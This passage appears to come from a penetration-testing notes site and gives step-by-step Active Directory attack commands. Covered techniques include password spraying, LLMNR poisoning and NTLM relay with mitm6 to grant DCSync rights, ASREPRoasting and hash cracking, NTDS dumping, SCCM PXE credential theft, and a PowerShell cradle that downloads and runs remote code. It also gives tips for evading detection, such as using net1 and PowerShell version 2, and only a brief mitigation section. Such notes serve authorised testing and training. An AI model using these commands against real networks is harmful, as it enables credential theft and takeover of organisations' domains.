&lt;Code Type=\"Class\" Language=\"cs\"&gt;\n        &lt;![CDATA[\n\n            using System;\n            using Microsoft.Build.Framework;\n            using Microsoft.Build.Utilities;\n\n            public class MSBuildTest : Task, ITask\n            {\n                public override bool Execute()\n                {\n                    Console.WriteLine(\"Hello World\");\n                    return true;\n                }\n            }\n\n        ]]&gt;\n      &lt;/Code&gt;\n    &lt;/Task&gt;\n  &lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre> <pre><code>msbuild.exe helloworld.xml\n</code></pre> <p>note</p> <p>Organizations often block the <code>PowerShell.exe</code> executable, but forget about the other PowerShell executable locations such as <code>%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code> or <code>PowerShell_ISE.exe</code></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#powershell-constrained-language-mode","title":"PowerShell Constrained Language Mode","text":"<p>Will prevent tons of useful powershell features <pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#laps","title":"LAPS","text":"<p>https://github.com/leoloobeek/LAPSToolkit Can help us find ADUsers that have permissions to read LAPS passwords <pre><code>Find-LAPSDelegatedGroups\n</code></pre> The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with \"All Extended Rights.\" Users with \"All Extended Rights\" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for. <pre><code>Find-AdmPwdExtendedRights\n</code></pre> Find computers with laps enabled <pre><code>Get-LAPSComputers\n</code></pre></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/","title":"Group Membership","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#identify","title":"Identify","text":"<ul> <li>Domain Admins<ul> <li>Full control of the domain and can manage all resources in the domain.</li> </ul> </li> <li>Enterprise Admins<ul> <li>This group exists in the root domain of a forest and has full rights to administer any domain within the forest.</li> </ul> </li> <li>Schema Admins<ul> <li>Members can modify the AD schema, which affects the entire forest. This group should have no permanent members unless schema changes are being made.</li> </ul> </li> <li>Administrators (Built-in)<ul> <li>By default, this group has wide-ranging administrative privileges on a domain controller.</li> </ul> </li> <li>Server Operators<ul> <li>Members can log on to domain controllers, start/stop services, format hard drives, and perform other significant administrative tasks.</li> </ul> </li> <li>Backup Operators<ul> <li>Members can bypass file permissions to back up and restore files across the domain controller. This often grants access to sensitive data.</li> </ul> </li> <li>Account Operators<ul> <li>Members can create, modify, and delete most user and group accounts (except for certain high-privilege groups), making them powerful with regard to identity management.</li> </ul> </li> <li>DNS Admins<ul> <li>Members manage DNS servers, which control name resolution. A compromise here can enable attacks like DNS poisoning or redirection.</li> </ul> </li> <li>Key Admins &amp; Enterprise Key Admins<ul> <li>Introduced in newer versions of Active Directory Certificate Services (AD CS); these groups can manage public key infrastructure (PKI) objects and certificate authorities.</li> </ul> </li> <li>Exchange Organization Management (if Microsoft Exchange is installed)<ul> <li>Members can administer all Exchange resources and mailboxes, with significant access to messaging data.</li> </ul> </li> </ul>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#exploit","title":"Exploit","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#backup-operators","title":"Backup Operators","text":"<p>Remote <pre><code>nxc smb &lt;target&gt; -u '' -p '' -M backup_operator\n</code></pre> Get machine account hash and dump ntds with that. <pre><code>nxc smb 172.16.210.5 -u 'DC01$' -H &lt;MachineAccHash&gt; --ntds --user Administrator\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#exchange-groups","title":"Exchange Groups","text":"<p>https://github.com/gdedrouas/Exchange-AD-Privesc</p> <p>Exchange Windows Permissions</p> <ul> <li>members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges.</li> </ul> <p>Organization Management</p> <ul> <li>access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.</li> </ul>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/","title":"Living Off the Land Enumeration","text":"","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#os-context","title":"OS Context","text":"<p>Basic enum commands</p> Command Result <code>hostname</code> Prints the PC's Name <code>[System.Environment]::OSVersion.Version</code> Prints out the OS version and revision level <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> Prints the patches and hotfixes applied to the host <code>ipconfig /all</code> Prints out network adapter state and configurations <code>set</code> Displays a list of environment variables for the current session (ran from CMD-prompt) <code>echo %USERDOMAIN%</code> Displays the domain name to which the host belongs (ran from CMD-prompt) <code>echo %logonserver%</code> Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) <pre><code>systeminfo\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#powershell","title":"Powershell","text":"<p><pre><code>Get-Module\n</code></pre> <pre><code>Get-ExecutionPolicy -List\n</code></pre> <pre><code>Set-ExecutionPolicy Bypass -Scope Process\n</code></pre> <pre><code>Get-ChildItem Env: | ft Key,Value\n</code></pre> <pre><code>Get-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\n</code></pre> <pre><code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#opsec-techniques","title":"OPSEC Techniques","text":"<pre><code>powershell.exe -version 2\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#checking-defenses","title":"Checking Defenses","text":"<p><pre><code>netsh advfirewall show allprofiles\n</code></pre> <pre><code>sc query windefend\n</code></pre> <pre><code>Get-MpComputerStatus\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#other-users-on-host","title":"Other users on host?","text":"<pre><code>qwinsta\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#network-information","title":"Network Information","text":"<pre><code>arp -a\nipconfig /all\nroute print\n</code></pre> <p>note</p> <p>Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment.</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<p><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre> <pre><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List\n</code></pre> <pre><code>wmic process list /format:list\n</code></pre> <pre><code>wmic ntdomain list /format:list\n</code></pre> <pre><code>wmic useraccount list /format:list\n</code></pre> <pre><code>wmic group list /format:list\n</code></pre> <pre><code>wmic sysaccount list /format:list\n</code></pre> https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#net-commands","title":"Net Commands","text":"<p><pre><code>net accounts\n</code></pre> <pre><code>net accounts /domain\n</code></pre> <pre><code>net group /domain\n</code></pre> <pre><code>net group \"Domain Admins\" /domain\n</code></pre> <pre><code>net group \"domain computers\" /domain\n</code></pre> <pre><code>net group \"Domain Controllers\" /domain\n</code></pre> <pre><code>net group &lt;domain_group_name&gt; /domain\n</code></pre> <pre><code>net groups /domain\n</code></pre> List of domain groups <pre><code>net localgroup\n</code></pre> <pre><code>net localgroup administrators /domain\n</code></pre> <pre><code>net localgroup Administrators\n</code></pre> <pre><code>net localgroup administrators [username] /add\n</code></pre> <pre><code>net share\n</code></pre> <pre><code>net user &lt;ACCOUNT_NAME&gt; /domain\n</code></pre> <pre><code>net user /domain\n</code></pre> <pre><code>net user %username%\n</code></pre> Information about the current user <pre><code>net use x: \\computer\\share\n</code></pre> <pre><code>net view\n</code></pre> <pre><code>net view /all /domain[:domainname]\n</code></pre> <pre><code>Shares on the domains\n</code></pre> <pre><code>net view /domain \n</code></pre></p> <p>OPSEC</p> <p>Typing <code>net1</code> instead of <code>net</code> will execute the same functions without the potential trigger from the net string.</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#dsquery","title":"Dsquery","text":"<pre><code>C:\\Windows\\System32\\dsquery.dll\n</code></pre> <p>note</p> <p>Elevated privs required for dsquery</p> <p><pre><code>dsquery user\n</code></pre> <pre><code>dsquery computer\n</code></pre> We can use a dsquery wildcard search to view all objects in an OU, for example. <pre><code>dsquery * \"CN=Users,DC=DOMAIN,DC=LOCAL\"\n</code></pre> <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre> <pre><code>dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Null%20Session/","title":"Null Session","text":"<p>Edit <code>/etc/resolv.conf</code> to prioritize the DC.</p> <p>Enum DCs: <pre><code>nslookup -type=SVR _ldap._tcp.FQDN\n</code></pre></p> <p>Use smbclient to check against all DCs</p> <pre><code>for dc in $(cat dcs.txt); do echo $dc &amp;&amp; smbclient -N -L \\\\\\\\$dc; done; \n</code></pre> <p>or: auth.py</p> <pre><code>auth smb &lt;dcs.txt&gt; \n</code></pre> <p>note</p> <p>anon login != unauth enum, you should try to pull info to show impact. </p> <p>Try to pull users:</p> <pre><code>enum4linux-ng -U &lt;DC&gt;\n</code></pre>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/","title":"Password Policy Enumeration","text":"","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/#from-linux","title":"From Linux","text":"<p><pre><code>nxc smb 172.16.5.5 -u &lt;user&gt; -p password&gt; --pass-pol\n</code></pre> <pre><code>rpcclient -U \"\" -N &lt;target-ip&gt;\nrpcclient -U \"username\" &lt;target-ip&gt;\nrpcclient $&gt; querydominfo\n</code></pre> <pre><code>enum4linux -P &lt;target-ip&gt;\n</code></pre> <pre><code>ldeep ldap -u 'USER' -p \"PASS' -d 'domain.local' -s $IP domain_policy\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/#from-windows","title":"From Windows","text":"<p><pre><code>net accounts\n</code></pre> PowerView <pre><code>Get-DomainPolicy\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/SMB%20Signing/","title":"SMB Signing","text":""},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/SMB%20Signing/#unauthenticated","title":"Unauthenticated:","text":"<p>Scan entire ranges: <pre><code>sudo nmap -p 445 --script=smb-security-mode.nse &lt;target-ip/range&gt;\n</code></pre></p> <pre><code>nxc smb &lt;subnet&gt; --gen-relay-list nosigning.txt\n</code></pre> <pre><code>auth smb &lt;subnet&gt; \n</code></pre>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/SMB%20Signing/#authenticated","title":"Authenticated:","text":"<pre><code>runas /netonly domain/user cmd.exe\npowershell -ep bypass\n. .\\powerview.ps1\n</code></pre> <p>Dump computers and scan: <pre><code>Get-DomainComputer -Properties dnshostname | Select-Object -ExpandProperty dnshostname | Out-File -FilePath computers.txt\n</code></pre></p> <pre><code>nxc smb computers.txt --gen-relay-list &lt;output_file&gt;\n</code></pre> <pre><code>auth smb computers.txt \n</code></pre> <p>With bloodhound: <pre><code>MATCH (n:Computer)\nWHERE n.smbsigning = False\nRETURN n\n</code></pre></p>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/SMB%20Signing/#where-to","title":"Where to?","text":"<ul> <li>Authentication Coercion</li> <li>Relay Attacks</li> </ul>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Service%20Enumeration/","title":"Service Enumeration","text":"","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Service%20Enumeration/#smb","title":"SMB","text":"<p><pre><code>nxc smb &lt;ip&gt; -u '' -p '' --shares\n</code></pre> <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M spider_plus --share 'sharename'\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -H &lt;ip&gt;\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -H &lt;ip&gt; -R 'sharename' --dir-only\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/","title":"ASREPRoast","text":"","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/#identify","title":"Identify","text":"<p>NXC (remotely) <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --query '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \"\"\n</code></pre> Locally: ADSearch Github <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName\n</code></pre> Locally: lolbin <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre> Locally: powerview <pre><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontro\n</code></pre></p>","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/ASREPRoast/#exploit","title":"Exploit","text":"<p>Ask for TGS  remotely: <pre><code>nxc ldap &lt;IP&gt; -u '&lt;USER&gt;' -p '' --asreproast output.txt\n</code></pre> <pre><code>impacket-GetNPUsers domain.local/svc-test -no-pass\n</code></pre> locally: <pre><code>Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:svc-test /nowrap\n</code></pre> <pre><code>Get-ASREPHash -Username svc-test -verbose\n</code></pre></p> <p>Crack ticket <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> <pre><code>john --wordlist=&lt;wordlist&gt; hashes.txt\n</code></pre></p>","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/IPv6%20Attacks/","title":"IPv6 Attacks","text":"<p>IPv6 has been adopted slowly and thus underutilized in environments. If IPv6 name resolution is enabled, but a proper DNS server has not been setup to respond to queries, we can man-in-the-middle by using Web Proxy Auto-Discovery Protocol (WPAD) resolution requests to capture and relay hashes to the DC.</p> <p> this attack is most consistently triggered on machine reboot or network stack reload so early mornings are probably the best time to perform this attack</p>","tags":["Initial-Access","MITM6","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/IPv6%20Attacks/#mitm6-ntlmrelayx","title":"mitm6 + ntlmrelayx","text":"<p>Start mitm6 <pre><code>sudo mitm6 -d domain.local\n</code></pre> Now start ntlmrelayx, specify a relay target (DC prolly) will output ldapdomaindump as HTML as well.  <pre><code>impacket-ntlmrelayx -6 -t ldaps://&lt;DCIP&gt; -wh wpad.domain.local -l lootme\n</code></pre> These options instruct ntlmrelayx to do an ldapdomaindump if user hashes are relayed, and create an account with DCSync privileges if a domain admins hash is relayed.</p>","tags":["Initial-Access","MITM6","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/","title":"LLMNR Poisoning","text":"","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#from-linux","title":"From Linux","text":"<p>https://github.com/SpiderLabs/Responder <pre><code>sudo responder -I eth0 \n</code></pre> Wait for hashes to come in Crack them with <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#from-windows","title":"From Windows","text":"","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#using-inveigh","title":"Using Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh <pre><code>Import-Module .\\Inveigh.ps1\n</code></pre> <pre><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre></p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p><pre><code>.\\Inveigh.exe\n</code></pre> We can quickly view unique captured hashes by typing <code>GET NTLMV2UNIQUE</code>. We can type in <code>GET NTLMV2USERNAMES</code> and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.</p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#abuse","title":"Abuse","text":"<p>Once you receive a response:</p> <p>you can either crack the Net-NTLMv2 hash</p> <ul> <li>See: Hash Cracking</li> </ul> <p>Or relay the to authenticate to a service</p> <ul> <li>See: Relay Attacks</li> </ul>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/LLMNR%20Poisoning/#mitigation","title":"Mitigation","text":"<ol> <li>Select \"Turn OFF multicast Name Resolution\" under Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor</li> <li>Disable NBT-NS navigate to Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab and select \"Disable NetBios over TCP/IP\".  If you cannot disable for whatever reason</li> <li>Require Network Access Control (NAC)</li> <li>Require strong passwords: over 14 characters with capitals and symbols and no common words. The better the password, the longer it takes an attacker to crack the hash</li> </ol>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/","title":"Password Stuff","text":"<p>note</p> <p>It is worth targeting high-value hosts such as <code>SQL</code> or <code>Microsoft Exchange</code> servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.</p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#wordlist-generation","title":"Wordlist Generation","text":"<p>Add likely words to a file (domain name, seasons, employees, etc). Use hashcat with ruleset to generate the alterations <pre><code>hashcat --force words.txt -r /usr/share/hashcat/rules/best64.rule --stdout &gt; wordlist.txt\n</code></pre> you should also prolly append an exclamation point to the words as well.</p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#password-spraying","title":"Password Spraying","text":"","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#from-linux","title":"From Linux","text":"<p><pre><code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre> <pre><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n</code></pre> <pre><code>nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n</code></pre> <pre><code>nxc smb 172.16.5.5 -u avazquez -p Password123\n</code></pre> Spray local admin hash around domain <pre><code>nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre></p> <p>note</p> <p>The <code>--local-auth</code> flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. <code>Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain</code></p> <p>From Windows https://github.com/dafthack/DomainPasswordSpray If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. <pre><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre> <pre><code>Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#external-password-spraying","title":"External Password Spraying","text":"<ul> <li>Microsoft 0365</li> <li>Outlook Web Exchange</li> <li>Exchange Web Access</li> <li>Skype for Business</li> <li>Lync Server</li> <li>Microsoft Remote Desktop Services (RDS) Portals</li> <li>Citrix portals using AD authentication</li> <li>VDI implementations using AD authentication such as VMware Horizon</li> <li>VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)</li> <li>Custom web applications that use AD authentication</li> </ul>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#workarounds","title":"Workarounds","text":"<p>\u201cPassword must be changed on next logon\u201d \u201cPassword_must_change\u201d You can try two things <pre><code>rpcclient -U &lt;user&gt; &lt;IP&gt;\nrpcclient $&gt; setuserinfo2 &lt;user&gt; 23 'Password123!'\n</code></pre> <pre><code>smbpasswd -U &lt;user&gt; -r &lt;IP&gt;\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p> <p>Remote <pre><code>nxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n</code></pre> Local <pre><code>Import-Module powerview.ps1\nGet-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Password%20Stuff/#passwords-in-files","title":"Passwords in files","text":"<pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/","title":"Pre Boot Execution Environment PXE","text":"","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#technique","title":"Technique","text":"<p>This technique provides initial access by exploiting the Pre-Boot Execution Environment (PXE), a standard for booting computers over the network. In corporate environments, PXE is commonly used by System Center Configuration Manager (SCCM) to deploy operating systems.</p> <p>An attacker on the local network can masquerade as a new computer requesting a boot image. By capturing the SCCM boot media files, the attacker can perform an offline password cracking attack to decrypt them. A successful decryption reveals sensitive information, most notably the credentials for the Network Access Account (NAA) or domain join accounts, which can be used for initial access and privilege escalation within the Active Directory domain.</p> <p>note</p> <p>The presence of PXE is a common indicator that SCCM is being used as well, but not always</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#prerequisites","title":"Prerequisites","text":"<p>Access Level: An attacker needs to be on the same local network (broadcast domain) as the SCCM PXE-enabled Distribution Point. No prior domain credentials are required.</p> <p>System State:</p> <ul> <li> <p>A PXE-enabled SCCM Distribution Point must be accessible on the network.</p> </li> <li> <p>The attacker's machine must be a Windows system to run the required tool, <code>PXEThief</code>.</p> </li> <li> <p>The attacker's machine must be seen as an \"Unknown Computer\" by SCCM.</p> </li> <li> <p>A <code>tftp</code> client is required to download boot files.</p> </li> <li> <p><code>hashcat</code> and a custom SCCM hashcat module are needed for password cracking.</p> </li> </ul> <p>Information: The IP address of the SCCM Distribution Point (DP) is helpful, though it can sometimes be discovered.</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful attack grants the attacker highly valuable credentials. The Network Access Account and Domain Join Account often have permissions to read from most Active Directory objects and write to computer objects, providing a significant foothold for lateral movement and further exploitation.</p> <p>OPSEC</p> <ul> <li> <p>Initial PXE/DHCP requests are broadcast traffic and may not appear suspicious.</p> </li> <li> <p>The <code>tftp</code> file transfer is unencrypted and could be flagged by network monitoring.</p> </li> <li> <p>Subsequent authenticated requests to the SCCM Management Point (MP) originate from an attacker-controlled, unmanaged device, which could be an indicator of compromise if client origins are monitored.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#identify","title":"Identify","text":"<p>The primary method for identifying a vulnerable PXE server is to use the <code>PXEThief</code> tool. While it has a discovery option, directly targeting a known or suspected SCCM server IP address is more reliable. https://github.com/MWR-CyberSec/PXEThief</p> <p>note</p> <p>PXEThief  should only be used on windows due to the pywin32 dependency, it also works best with python 3.10 </p> <p>Attempt to autodiscover distribution point IP: <pre><code>python pxethief.py 1 \n</code></pre></p> <p>You already know the SCCM server ip (more reliable): <pre><code>python pxethief.py 2 &lt;DISTRIBUTION_POINT_IP&gt;\n</code></pre> A successful response will provide the file paths for the .boot.var and .boot.bcd files on the server's TFTP share.</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#execution","title":"Execution","text":"<p>Step 1: Request Boot Media Paths</p> <p>Use PXEThief to coerce the DP into providing the location of the encrypted boot media files.</p> <pre><code>python pxethief.py 2 &lt;IP&gt;\n</code></pre> <p>This will output the full paths to the <code>.boot.var</code> and <code>.boot.bcd</code> files.</p> <p>Step 2: Download the Encrypted Boot Variable File</p> <p>Use the <code>tftp</code> client to download the <code>.boot.var</code> file from the Distribution Point.</p> <pre><code>tftp -i &lt;DISTRIBUTION_POINT_IP&gt; GET \"\\\\SMSTemp\\\\&lt;...&gt;.boot.var\" \"&lt;...&gt;.boot.var\"\n</code></pre> <p>Step 3: Extract the Hash for Cracking</p> <p>Use <code>PXEThief</code> with option 5 to process the downloaded <code>.boot.var</code> file and generate a crackable hash.</p> <pre><code>python pxethief.py 5 '.\\\\&lt;...&gt;.boot.var'\n</code></pre> <p>A specific hashcat module must be used to crack the hash. Here is how to install it:</p> <pre><code>cd hashcat_pxe/\ngit clone https://github.com/hashcat/hashcat.git\ngit clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module\ncp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/\ncp 